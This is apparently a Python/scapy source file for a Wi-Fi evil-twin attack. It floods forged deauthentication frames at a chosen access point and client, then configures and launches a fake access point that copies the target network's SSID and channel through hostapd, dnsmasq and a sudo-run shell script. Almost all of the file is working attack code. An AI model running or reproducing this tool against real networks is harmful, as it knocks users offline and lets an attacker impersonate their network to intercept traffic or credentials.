from  scapy.all import *
from string import Template
from network import command_line
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth


def deauthentication_packet(interface, net_mac, client_mac):
    # deauthentication packets
    # if addr = 'ff:ff:ff:ff:ff:ff' than will disconnect all the cliens. harmful!
    # reason 3 - because sending station is leaving 
    # or has left independent Basic Service Service Set (IBSS) or ESS
    ap_deauth = RadioTap()/Dot11(addr1=client_mac, addr2=net_mac, addr3=net_mac)/Dot11Deauth()
    cli_deauth = RadioTap()/Dot11(addr1=net_mac, addr2=client_mac, addr3=client_mac)/Dot11Deauth()

    print('\nsend deauthentication packet...')

    sendp(ap_deauth, count=10000, iface=interface)
    sendp(cli_deauth, count=10000, iface=interface)


class Fake:
    def __init__(self, interface, net_target, cli_mac):
        self.interface = interface
        self.ssid = net_target[0]
        self.net_mac = net_target[1]
        self.channel = net_target[2]
        self.cli_mac = cli_mac
        print('\ncreating fake ap')

    def fake_ap(self):
        print('\ncreate fake access point')
        self.create_enviroment()
    
    def create_enviroment(self):
        """
        prepare the environment setup for creating the fake access point
        :param access_point_bssid represent the network name
        """
        second_interface = input('Insert your other network card name: ')
        print("creating enviroment varible...")
        
        command_line('rm -rf tempFolder/')
        command_line('cp -r router tempFolder')

        with open('tempFolder/hostapd.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.interface, 
                                        SSID=self.ssid,
                                        CHANNEL=self.channel))
            f.truncate()
        with open('tempFolder/dnsmasq.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.interface))
            f.truncate()
        with open('tempFolder/script.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.interface, 
                                        SECOND_INTERFACE=second_interface))
            f.truncate()

        command_line('sudo sh tempFolder/script.sh')
        # command_line('hostapd tempFolder/hostapd.conf')
